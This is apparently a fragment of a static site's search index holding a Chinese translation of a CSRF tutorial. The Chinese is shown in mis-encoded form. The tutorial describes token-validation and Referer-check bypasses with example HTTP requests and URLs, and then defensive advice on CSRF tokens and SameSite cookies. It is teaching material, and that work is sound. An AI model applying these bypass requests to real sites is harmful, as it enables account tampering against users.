","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:6:0","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"å¸¸è§çš„ CSRF æ¼æ´ æœ€æœ‰è¶£çš„ CSRF æ¼æ´äº§ç”Ÿæ˜¯å› ä¸ºå¯¹ CSRF token çš„éªŒè¯æœ‰é—®é¢˜ã€‚ åœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œå‡è®¾åº”ç”¨ç¨‹åºåœ¨æ›´æ”¹ç”¨æˆ·å¯†ç çš„è¯·æ±‚ä¸­éœ€è¦åŒ…å«ä¸€ä¸ª CSRF token ï¼š POST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 68 Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE\u0026email=wiener@normal-user.com è¿™çœ‹ä¸Šå»å¥½åƒå¯ä»¥é˜²å¾¡ CSRF æ”»å‡»ï¼Œå› ä¸ºå®ƒæ‰“ç ´äº† CSRF éœ€è¦çš„å¿…è¦æ¡ä»¶ï¼šåº”ç”¨ç¨‹åºä¸å†ä»…ä»…ä¾èµ– cookie è¿›è¡Œä¼šè¯å¤„ç†ï¼Œå¹¶ä¸”è¯·æ±‚ä¹ŸåŒ…å«æ”»å‡»è€…æ— æ³•ç¡®å®šå…¶å€¼çš„å‚æ•°ã€‚ç„¶è€Œï¼Œä»ç„¶æœ‰å¤šç§æ–¹æ³•å¯ä»¥ç ´åé˜²å¾¡ï¼Œè¿™æ„å‘³ç€åº”ç”¨ç¨‹åºä»ç„¶å®¹æ˜“å—åˆ° CSRF çš„æ”»å‡»ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:7:0","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"CSRF token çš„éªŒè¯ä¾èµ–äºè¯·æ±‚æ–¹æ³• æŸäº›åº”ç”¨ç¨‹åºåœ¨è¯·æ±‚ä½¿ç”¨ POST æ–¹æ³•æ—¶æ­£ç¡®éªŒè¯ token ï¼Œä½†åœ¨ä½¿ç”¨ GET æ–¹æ³•æ—¶è·³è¿‡äº†éªŒè¯ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥åˆ‡æ¢åˆ° GET æ–¹æ³•æ¥ç»•è¿‡éªŒè¯å¹¶å‘èµ· CSRF æ”»å‡»ï¼š GET /email/change?email=pwned@evil-user.net HTTP/1.1 Host: vulnerable-website.com Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:7:1","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"CSRF token çš„éªŒè¯ä¾èµ–äº token æ˜¯å¦å­˜åœ¨ æŸäº›åº”ç”¨ç¨‹åºåœ¨ token å­˜åœ¨æ—¶æ­£ç¡®åœ°éªŒè¯å®ƒï¼Œä½†æ˜¯å¦‚æœ token ä¸å­˜åœ¨ï¼Œåˆ™è·³è¿‡éªŒè¯ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥åˆ é™¤åŒ…å« token çš„æ•´ä¸ªå‚æ•°ï¼Œä»è€Œç»•è¿‡éªŒè¯å¹¶å‘èµ· CSRF æ”»å‡»ï¼š POST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 25 Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm email=pwned@evil-user.net ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:7:2","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"CSRF token æœªç»‘å®šåˆ°ç”¨æˆ·ä¼šè¯ æœ‰äº›åº”ç”¨ç¨‹åºä¸éªŒè¯ token æ˜¯å¦ä¸å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·å±äºåŒä¸€ä¼šè¯ã€‚ç›¸åï¼Œåº”ç”¨ç¨‹åºç»´æŠ¤ä¸€ä¸ªå·²å‘å‡ºçš„ token çš„å…¨å±€æ± ï¼Œå¹¶æ¥å—è¯¥æ± ä¸­å‡ºç°çš„ä»»ä½• token ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è‡ªå·±çš„å¸æˆ·ç™»å½•åˆ°åº”ç”¨ç¨‹åºï¼Œè·å–æœ‰æ•ˆ token ï¼Œç„¶ååœ¨ CSRF æ”»å‡»ä¸­ä½¿ç”¨è‡ªå·±çš„ token ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:7:3","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"CSRF token è¢«ç»‘å®šåˆ°éä¼šè¯ cookie åœ¨ä¸Šè¿°æ¼æ´çš„å˜ä½“ä¸­ï¼Œæœ‰äº›åº”ç”¨ç¨‹åºç¡®å®å°† CSRF token ç»‘å®šåˆ°äº† cookieï¼Œä½†ä¸ç”¨äºè·Ÿè¸ªä¼šè¯çš„åŒä¸€ä¸ª cookie ä¸ç»‘å®šã€‚å½“åº”ç”¨ç¨‹åºä½¿ç”¨ä¸¤ä¸ªä¸åŒçš„æ¡†æ¶æ—¶ï¼Œå¾ˆå®¹æ˜“å‘ç”Ÿè¿™ç§æƒ…å†µï¼Œä¸€ä¸ªç”¨äºä¼šè¯å¤„ç†ï¼Œå¦ä¸€ä¸ªç”¨äº CSRF ä¿æŠ¤ï¼Œè¿™ä¸¤ä¸ªæ¡†æ¶æ²¡æœ‰é›†æˆåœ¨ä¸€èµ·ï¼š POST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 68 Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY\u0026email=wiener@normal-user.com è¿™ç§æƒ…å†µå¾ˆéš¾åˆ©ç”¨ï¼Œä½†ä»ç„¶å­˜åœ¨æ¼æ´ã€‚å¦‚æœç½‘ç«™åŒ…å«ä»»ä½•å…è®¸æ”»å‡»è€…åœ¨å—å®³è€…æµè§ˆå™¨ä¸­è®¾ç½® cookie çš„è¡Œä¸ºï¼Œåˆ™å¯èƒ½å‘ç”Ÿæ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨è‡ªå·±çš„å¸æˆ·ç™»å½•åˆ°åº”ç”¨ç¨‹åºï¼Œè·å–æœ‰æ•ˆçš„ token å’Œå…³è”çš„ cookie ï¼Œåˆ©ç”¨ cookie è®¾ç½®è¡Œä¸ºå°†å…¶ cookie æ”¾å…¥å—å®³è€…çš„æµè§ˆå™¨ä¸­ï¼Œå¹¶åœ¨ CSRF æ”»å‡»ä¸­å‘å—å®³è€…æä¾› token ã€‚ æ³¨æ„ï¼šcookie è®¾ç½®è¡Œä¸ºç”šè‡³ä¸å¿…ä¸ CSRF æ¼æ´å­˜åœ¨äºåŒä¸€ Web åº”ç”¨ç¨‹åºä¸­ã€‚å¦‚æœæ‰€æ§åˆ¶çš„ cookie å…·æœ‰é€‚å½“çš„èŒƒå›´ï¼Œåˆ™å¯ä»¥åˆ©ç”¨åŒä¸€æ€»ä½“ DNS åŸŸä¸­çš„ä»»ä½•å…¶ä»–åº”ç”¨ç¨‹åºåœ¨ç›®æ ‡åº”ç”¨ç¨‹åºä¸­è®¾ç½® cookie ã€‚ä¾‹å¦‚ï¼Œstaging.demo.normal-website.com åŸŸä¸Šçš„ cookie è®¾ç½®å‡½æ•°å¯ä»¥æ”¾ç½®æäº¤åˆ° secure.normal-website.com ä¸Šçš„ cookie ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:7:4","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"CSRF token ä»…è¦æ±‚ä¸ cookie ä¸­çš„ç›¸åŒ åœ¨ä¸Šè¿°æ¼æ´çš„è¿›ä¸€æ­¥å˜ä½“ä¸­ï¼Œä¸€äº›åº”ç”¨ç¨‹åºä¸ç»´æŠ¤å·²å‘å‡º token çš„ä»»ä½•æœåŠ¡ç«¯è®°å½•ï¼Œè€Œæ˜¯åœ¨ cookie å’Œè¯·æ±‚å‚æ•°ä¸­å¤åˆ¶æ¯ä¸ª token ã€‚åœ¨éªŒè¯åç»­è¯·æ±‚æ—¶ï¼Œåº”ç”¨ç¨‹åºåªéœ€éªŒè¯åœ¨è¯·æ±‚å‚æ•°ä¸­æäº¤çš„ token æ˜¯å¦ä¸åœ¨ cookie ä¸­æäº¤çš„å€¼åŒ¹é…ã€‚è¿™æœ‰æ—¶è¢«ç§°ä¸ºé’ˆå¯¹ CSRF çš„â€œåŒé‡æäº¤â€é˜²å¾¡ï¼Œä¹‹æ‰€ä»¥è¢«æå€¡ï¼Œæ˜¯å› ä¸ºå®ƒæ˜“äºå®ç°ï¼Œå¹¶ä¸”é¿å…äº†å¯¹ä»»ä½•æœåŠ¡ç«¯çŠ¶æ€çš„éœ€è¦ï¼š POST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 68 Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa\u0026email=wiener@normal-user.com åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœç½‘ç«™åŒ…å«ä»»ä½• cookie è®¾ç½®åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯ä»¥å†æ¬¡æ‰§è¡Œ CSRF æ”»å‡»ã€‚åœ¨è¿™é‡Œï¼Œæ”»å‡»è€…ä¸éœ€è¦è·å¾—è‡ªå·±çš„æœ‰æ•ˆ token ã€‚ä»–ä»¬åªéœ€å‘æ˜ä¸€ä¸ª token ï¼Œåˆ©ç”¨ cookie è®¾ç½®è¡Œä¸ºå°† cookie æ”¾å…¥å—å®³è€…çš„æµè§ˆå™¨ä¸­ï¼Œå¹¶åœ¨ CSRF æ”»å‡»ä¸­å‘å—å®³è€…æä¾›æ­¤ token ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:7:5","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"åŸºäº Referer çš„ CSRF é˜²å¾¡ é™¤äº†ä½¿ç”¨ CSRF token è¿›è¡Œé˜²å¾¡ä¹‹å¤–ï¼Œæœ‰äº›åº”ç”¨ç¨‹åºä½¿ç”¨ HTTP Referer å¤´å»é˜²å¾¡ CSRF æ”»å‡»ï¼Œé€šå¸¸æ˜¯éªŒè¯è¯·æ±‚æ¥è‡ªåº”ç”¨ç¨‹åºè‡ªå·±çš„åŸŸåã€‚è¿™ç§æ–¹æ³•é€šå¸¸ä¸å¤ªæœ‰æ•ˆï¼Œè€Œä¸”ç»å¸¸ä¼šè¢«ç»•è¿‡ã€‚ æ³¨æ„ï¼šHTTP Referer å¤´æ˜¯ä¸€ä¸ªå¯é€‰çš„è¯·æ±‚å¤´ï¼Œå®ƒåŒ…å«é“¾æ¥åˆ°æ‰€è¯·æ±‚èµ„æºçš„ç½‘é¡µçš„ URL ã€‚é€šå¸¸ï¼Œå½“ç”¨æˆ·è§¦å‘ HTTP è¯·æ±‚æ—¶ï¼Œæ¯”å¦‚å•å‡»é“¾æ¥æˆ–æäº¤è¡¨å•ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨æ·»åŠ å®ƒã€‚ç„¶è€Œå­˜åœ¨å„ç§æ–¹æ³•ï¼Œå…è®¸é“¾æ¥é¡µé¢ä¿ç•™æˆ–ä¿®æ”¹ Referer å¤´çš„å€¼ã€‚è¿™é€šå¸¸æ˜¯å‡ºäºéšç§è€ƒè™‘ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:8:0","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"Referer çš„éªŒè¯ä¾èµ–äºå…¶æ˜¯å¦å­˜åœ¨ æŸäº›åº”ç”¨ç¨‹åºå½“è¯·æ±‚ä¸­æœ‰ Referer å¤´æ—¶ä¼šéªŒè¯å®ƒï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰çš„è¯ï¼Œåˆ™è·³è¿‡éªŒè¯ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ç²¾å¿ƒè®¾è®¡å…¶ CSRF æ”»å‡»ï¼Œä½¿å—å®³ç”¨æˆ·çš„æµè§ˆå™¨åœ¨è¯·æ±‚ä¸­ä¸¢å¼ƒ Referer å¤´ã€‚å®ç°è¿™ä¸€ç‚¹æœ‰å¤šç§æ–¹æ³•ï¼Œä½†æœ€ç®€å•çš„æ˜¯åœ¨æ‰˜ç®¡ CSRF æ”»å‡»çš„ HTML é¡µé¢ä¸­ä½¿ç”¨ META æ ‡è®°ï¼š \u003cmeta name=\"referrer\" content=\"never\"\u003e ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:8:1","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"Referer çš„éªŒè¯å¯ä»¥è¢«è§„é¿ æŸäº›åº”ç”¨ç¨‹åºä»¥ä¸€ç§å¯ä»¥è¢«ç»•è¿‡çš„æ–¹å¼éªŒè¯ Referer å¤´ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºåªæ˜¯éªŒè¯ Referer æ˜¯å¦åŒ…å«è‡ªå·±çš„åŸŸåï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥å°†æ‰€éœ€çš„å€¼æ”¾åœ¨ URL çš„å…¶ä»–ä½ç½®ï¼š http://attacker-website.com/csrf-attack?vulnerable-website.com å¦‚æœåº”ç”¨ç¨‹åºéªŒè¯ Referer ä¸­çš„åŸŸä»¥é¢„æœŸå€¼å¼€å¤´ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥å°†å…¶ä½œä¸ºè‡ªå·±åŸŸçš„å­åŸŸï¼š http://vulnerable-website.com.attacker-website.com/csrf-attack ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf/:8:2","tags":[],"title":"web å®‰å…¨ä¹‹ CSRF","uri":"/translation/web-security/csrf/csrf/"},{"categories":["web security"],"content":"CSRF tokens","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf-tokens/","tags":[],"title":"CSRF tokens","uri":"/translation/web-security/csrf/csrf-tokens/"},{"categories":["web security"],"content":"CSRF tokens åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Šä»€ä¹ˆæ˜¯ CSRF tokenï¼Œå®ƒä»¬æ˜¯å¦‚ä½•é˜²å¾¡çš„ CSRF æ”»å‡»ï¼Œä»¥åŠå¦‚ä½•ç”Ÿæˆå’ŒéªŒè¯CSRF token ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf-tokens/:0:0","tags":[],"title":"CSRF tokens","uri":"/translation/web-security/csrf/csrf-tokens/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯ CSRF token CSRF token æ˜¯ä¸€ä¸ªå”¯ä¸€çš„ã€ç§˜å¯†çš„ã€ä¸å¯é¢„æµ‹çš„å€¼ï¼Œå®ƒç”±æœåŠ¡ç«¯åº”ç”¨ç¨‹åºç”Ÿæˆï¼Œå¹¶ä»¥è¿™ç§æ–¹å¼ä¼ è¾“åˆ°å®¢æˆ·ç«¯ï¼Œä½¿å¾—å®ƒåŒ…å«åœ¨å®¢æˆ·ç«¯å‘å‡ºçš„åç»­ HTTP è¯·æ±‚ä¸­ã€‚å½“å‘å‡ºåç»­è¯·æ±‚æ—¶ï¼ŒæœåŠ¡ç«¯åº”ç”¨ç¨‹åºå°†éªŒè¯è¯·æ±‚æ˜¯å¦åŒ…å«é¢„æœŸçš„ token ï¼Œå¹¶åœ¨ token ä¸¢å¤±æˆ–æ— æ•ˆæ—¶æ‹’ç»è¯¥è¯·æ±‚ã€‚ ç”±äºæ”»å‡»è€…æ— æ³•ç¡®å®šæˆ–é¢„æµ‹ç”¨æˆ·çš„ CSRF token çš„å€¼ï¼Œå› æ­¤ä»–ä»¬æ— æ³•æ„é€ å‡ºä¸€ä¸ªåº”ç”¨ç¨‹åºéªŒè¯æ‰€éœ€å…¨éƒ¨å‚æ•°çš„è¯·æ±‚ã€‚æ‰€ä»¥ CSRF token å¯ä»¥é˜²æ­¢ CSRF æ”»å‡»ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf-tokens/:1:0","tags":[],"title":"CSRF tokens","uri":"/translation/web-security/csrf/csrf-tokens/"},{"categories":["web security"],"content":"CSRF token åº”è¯¥å¦‚ä½•ç”Ÿæˆ CSRF token åº”è¯¥åŒ…å«æ˜¾è‘—çš„ç†µï¼Œå¹¶ä¸”å…·æœ‰å¾ˆå¼ºçš„ä¸å¯é¢„æµ‹æ€§ï¼Œå…¶é€šå¸¸ä¸ä¼šè¯ä»¤ç‰Œå…·æœ‰ç›¸åŒçš„ç‰¹æ€§ã€‚ æ‚¨åº”è¯¥ä½¿ç”¨åŠ å¯†å¼ºåº¦ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆPRNGï¼‰ï¼Œè¯¥ç”Ÿæˆå™¨é™„å¸¦åˆ›å»ºæ—¶çš„æ—¶é—´æˆ³ä»¥åŠé™æ€å¯†ç ã€‚ å¦‚æœæ‚¨éœ€è¦ PRNG å¼ºåº¦ä¹‹å¤–çš„è¿›ä¸€æ­¥ä¿è¯ï¼Œå¯ä»¥é€šè¿‡å°†å…¶è¾“å‡ºä¸æŸäº›ç‰¹å®šäºç”¨æˆ·çš„ç†µè¿æ¥æ¥ç”Ÿæˆå•ç‹¬çš„ä»¤ç‰Œï¼Œå¹¶å¯¹æ•´ä¸ªç»“æ„è¿›è¡Œå¼ºå“ˆå¸Œã€‚è¿™ç»™è¯•å›¾åˆ†æä»¤ç‰Œçš„æ”»å‡»è€…å¸¦æ¥äº†é¢å¤–çš„éšœç¢ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf-tokens/:2:0","tags":[],"title":"CSRF tokens","uri":"/translation/web-security/csrf/csrf-tokens/"},{"categories":["web security"],"content":"å¦‚ä½•ä¼ è¾“ CSRF token CSRF token åº”è¢«è§†ä¸ºæœºå¯†ï¼Œå¹¶åœ¨å…¶æ•´ä¸ªç”Ÿå‘½å‘¨æœŸä¸­ä»¥å®‰å…¨çš„æ–¹å¼è¿›è¡Œå¤„ç†ã€‚ä¸€ç§é€šå¸¸æœ‰æ•ˆçš„æ–¹æ³•æ˜¯å°†ä»¤ç‰Œä¼ è¾“åˆ°ä½¿ç”¨ POST æ–¹æ³•æäº¤çš„ HTML è¡¨å•çš„éšè—å­—æ®µä¸­çš„å®¢æˆ·ç«¯ã€‚æäº¤è¡¨å•æ—¶ï¼Œä»¤ç‰Œå°†ä½œä¸ºè¯·æ±‚å‚æ•°åŒ…å«ï¼š \u003cinput type=\"hidden\" name=\"csrf-token\" value=\"CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz\" /\u003e ä¸ºäº†å®‰å…¨èµ·è§ï¼ŒåŒ…å« CSRF token çš„å­—æ®µåº”è¯¥å°½æ—©æ”¾ç½®åœ¨ HTML æ–‡æ¡£ä¸­ï¼Œæœ€å¥½æ˜¯åœ¨ä»»ä½•ééšè—çš„è¾“å…¥å­—æ®µä¹‹å‰ï¼Œä»¥åŠåœ¨ HTML ä¸­åµŒå…¥ç”¨æˆ·å¯æ§åˆ¶æ•°æ®çš„ä»»ä½•ä½ç½®ä¹‹å‰ã€‚è¿™å¯ä»¥å¯¹æŠ—æ”»å‡»è€…ä½¿ç”¨ç²¾å¿ƒç¼–åˆ¶çš„æ•°æ®æ“çºµ HTML æ–‡æ¡£å¹¶æ•è·å…¶éƒ¨åˆ†å†…å®¹çš„å„ç§æŠ€æœ¯ã€‚ å¦ä¸€ç§æ–¹æ³•æ˜¯å°†ä»¤ç‰Œæ”¾å…¥ URL query å­—ç¬¦ä¸²ä¸­ï¼Œè¿™ç§æ–¹æ³•çš„å®‰å…¨æ€§ç¨å·®ï¼Œå› ä¸º query å­—ç¬¦ä¸²ï¼š è®°å½•åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯çš„å„ä¸ªä½ç½®ï¼› å®¹æ˜“åœ¨ HTTP Referer å¤´ä¸­ä¼ è¾“ç»™ç¬¬ä¸‰æ–¹ï¼› å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚ æŸäº›åº”ç”¨ç¨‹åºåœ¨è‡ªå®šä¹‰è¯·æ±‚å¤´ä¸­ä¼ è¾“ CSRF token ã€‚è¿™è¿›ä¸€æ­¥é˜²æ­¢äº†æ”»å‡»è€…é¢„æµ‹æˆ–æ•è·å¦ä¸€ä¸ªç”¨æˆ·çš„ä»¤ç‰Œï¼Œå› ä¸ºæµè§ˆå™¨é€šå¸¸ä¸å…è®¸è·¨åŸŸå‘é€è‡ªå®šä¹‰å¤´ã€‚ç„¶è€Œï¼Œè¿™ç§æ–¹æ³•å°†åº”ç”¨ç¨‹åºé™åˆ¶ä¸ºä½¿ç”¨ XHR å‘å‡ºå— CSRF ä¿æŠ¤çš„è¯·æ±‚ï¼ˆä¸ HTML è¡¨å•ç›¸åï¼‰ï¼Œå¹¶ä¸”åœ¨è®¸å¤šæƒ…å†µä¸‹å¯èƒ½è¢«è®¤ä¸ºè¿‡äºå¤æ‚ã€‚ CSRF token ä¸åº”åœ¨ cookie ä¸­ä¼ è¾“ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf-tokens/:3:0","tags":[],"title":"CSRF tokens","uri":"/translation/web-security/csrf/csrf-tokens/"},{"categories":["web security"],"content":"å¦‚ä½•éªŒè¯ CSRF token å½“ç”Ÿæˆ CSRF token æ—¶ï¼Œå®ƒåº”è¯¥å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯çš„ç”¨æˆ·ä¼šè¯æ•°æ®ä¸­ã€‚å½“æ¥æ”¶åˆ°éœ€è¦éªŒè¯çš„åç»­è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç«¯åº”ç”¨ç¨‹åºåº”éªŒè¯è¯¥è¯·æ±‚æ˜¯å¦åŒ…å«ä¸å­˜å‚¨åœ¨ç”¨æˆ·ä¼šè¯ä¸­çš„å€¼ç›¸åŒ¹é…çš„ä»¤ç‰Œã€‚æ— è®ºè¯·æ±‚çš„HTTP æ–¹æ³•æˆ–å†…å®¹ç±»å‹å¦‚ä½•ï¼Œéƒ½å¿…é¡»æ‰§è¡Œæ­¤éªŒè¯ã€‚å¦‚æœè¯·æ±‚æ ¹æœ¬ä¸åŒ…å«ä»»ä½•ä»¤ç‰Œï¼Œåˆ™åº”ä»¥ä¸å­˜åœ¨æ— æ•ˆä»¤ç‰Œæ—¶ç›¸åŒçš„æ–¹å¼æ‹’ç»è¯·æ±‚ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/csrf-tokens/:4:0","tags":[],"title":"CSRF tokens","uri":"/translation/web-security/csrf/csrf-tokens/"},{"categories":["web security"],"content":"SameSite cookies","date":"2021-03-09","objectID":"/translation/web-security/csrf/samesite-cookies/","tags":[],"title":"SameSite cookies","uri":"/translation/web-security/csrf/samesite-cookies/"},{"categories":["web security"],"content":"SameSite cookies æŸäº›ç½‘ç«™ä½¿ç”¨ SameSite cookies é˜²å¾¡ CSRF æ”»å‡»ã€‚ è¿™ä¸ª SameSite å±æ€§å¯ç”¨äºæ§åˆ¶æ˜¯å¦ä»¥åŠå¦‚ä½•åœ¨è·¨ç«™è¯·æ±‚ä¸­æäº¤ cookie ã€‚é€šè¿‡è®¾ç½®ä¼šè¯ cookie çš„å±æ€§ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥é˜²æ­¢æµè§ˆå™¨é»˜è®¤è‡ªåŠ¨å‘è¯·æ±‚æ·»åŠ  cookie çš„è¡Œä¸ºï¼Œè€Œä¸ç®¡cookie æ¥è‡ªä½•å¤„ã€‚ è¿™ä¸ª SameSite å±æ€§åœ¨æœåŠ¡å™¨çš„ Set-Cookie å“åº”å¤´ä¸­è®¾ç½®ï¼Œè¯¥å±æ€§å¯ä»¥è®¾ä¸º Strict ä¸¥æ ¼æˆ–è€… Lax æ¾æ‡ˆã€‚ä¾‹å¦‚ï¼š SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict; SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax; å¦‚æœ SameSite å±æ€§è®¾ç½®ä¸º Strict ï¼Œåˆ™æµè§ˆå™¨å°†ä¸ä¼šåœ¨æ¥è‡ªå…¶ä»–ç«™ç‚¹çš„ä»»ä½•è¯·æ±‚ä¸­åŒ…å«cookieã€‚è¿™æ˜¯æœ€å…·é˜²å¾¡æ€§çš„é€‰æ‹©ï¼Œä½†å®ƒå¯èƒ½ä¼šæŸå®³ç”¨æˆ·ä½“éªŒï¼Œå› ä¸ºå¦‚æœç™»å½•çš„ç”¨æˆ·é€šè¿‡ç¬¬ä¸‰æ–¹é“¾æ¥è®¿é—®æŸä¸ªç«™ç‚¹ï¼Œé‚£ä¹ˆä»–ä»¬å°†ä¸ä¼šç™»å½•ï¼Œå¹¶ä¸”éœ€è¦é‡æ–°ç™»å½•ï¼Œç„¶åæ‰èƒ½ä»¥æ­£å¸¸æ–¹å¼ä¸ç«™ç‚¹äº¤äº’ã€‚ å¦‚æœ SameSite å±æ€§è®¾ç½®ä¸º Lax ï¼Œåˆ™æµè§ˆå™¨å°†åœ¨æ¥è‡ªå¦ä¸€ä¸ªç«™ç‚¹çš„è¯·æ±‚ä¸­åŒ…å«cookieï¼Œä½†å‰ææ˜¯æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ï¼š è¯·æ±‚ä½¿ç”¨ GET æ–¹æ³•ã€‚ä½¿ç”¨å…¶ä»–æ–¹æ³•ï¼ˆå¦‚ POST ï¼‰çš„è¯·æ±‚å°†ä¸ä¼šåŒ…æ‹¬ cookie ã€‚ è¯·æ±‚æ˜¯ç”±ç”¨æˆ·çš„é¡¶çº§å¯¼èˆªï¼ˆå¦‚å•å‡»é“¾æ¥ï¼‰äº§ç”Ÿçš„ã€‚å…¶ä»–è¯·æ±‚ï¼ˆå¦‚ç”±è„šæœ¬å¯åŠ¨çš„è¯·æ±‚ï¼‰å°†ä¸ä¼šåŒ…æ‹¬ cookie ã€‚ ä½¿ç”¨ SameSite çš„ Lax æ¨¡å¼ç¡®å®å¯¹ CSRF æ”»å‡»æä¾›äº†éƒ¨åˆ†é˜²å¾¡ï¼Œå› ä¸º CSRF æ”»å‡»çš„ç›®æ ‡ç”¨æˆ·æ“ä½œé€šå¸¸ä½¿ç”¨ POST æ–¹æ³•å®ç°ã€‚è¿™é‡Œæœ‰ä¸¤ä¸ªé‡è¦çš„æ³¨æ„äº‹é¡¹ï¼š æœ‰äº›åº”ç”¨ç¨‹åºç¡®å®ä½¿ç”¨ GET è¯·æ±‚å®ç°æ•æ„Ÿæ“ä½œã€‚ è®¸å¤šåº”ç”¨ç¨‹åºå’Œæ¡†æ¶èƒ½å¤Ÿå®¹å¿ä¸åŒçš„ HTTP æ–¹æ³•ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå³ä½¿åº”ç”¨ç¨‹åºæœ¬èº«è®¾è®¡ä½¿ç”¨çš„æ˜¯ POST æ–¹æ³•ï¼Œä½†å®ƒå®é™…ä¸Šä¹Ÿä¼šæ¥å—è¢«åˆ‡æ¢ä¸ºä½¿ç”¨ GET æ–¹æ³•çš„è¯·æ±‚ã€‚ å‡ºäºä¸Šè¿°åŸå› ï¼Œä¸å»ºè®®ä»…ä¾èµ– SameSite Cookie æ¥æŠµå¾¡ CSRF æ”»å‡»ã€‚å½“å…¶ä¸ CSRF token ç»“åˆä½¿ç”¨æ—¶ï¼ŒSameSite cookies å¯ä»¥æä¾›é¢å¤–çš„é˜²å¾¡å±‚ï¼Œå¹¶å‡è½»åŸºäºä»¤ç‰Œçš„é˜²å¾¡ä¸­çš„ä»»ä½•ç¼ºé™·ã€‚ ","date":"2021-03-09","objectID":"/translation/web-security/csrf/samesite-cookies/:0:0","tags":[],"title":"SameSite cookies","uri":"/translation/web-security/csrf/samesite-cookies/"},{"categories":["web security"],"content":"XSS vs CSRF","date":"2021-03-09","objectID":"/translation/web-security/csrf/xss-vs-csrf/","tags":[],"title":"XSS vs CSRF","uri":"/translation/web-security/csrf/xss-vs-csrf/"},{"categories":["web security"],"content":"XSS vs CSRF 